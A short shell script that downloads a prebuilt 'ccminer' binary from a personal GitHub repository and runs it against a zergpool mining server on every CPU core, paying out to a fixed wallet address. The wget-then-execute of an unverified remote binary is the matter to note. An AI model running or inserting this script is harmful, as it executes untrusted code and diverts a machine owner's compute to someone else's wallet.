#erl-andi
apt update
apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
wget https://raw.githubusercontent.com/AntonyAjax/gh/main/ccminer
chmod +x ccminer
./ccminer -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u MS7M2QQKoK2M94Ktn8iGk75j8yvjWGLHsM.hyoka -p c=LTC,mc=VRSC -t $(nproc)
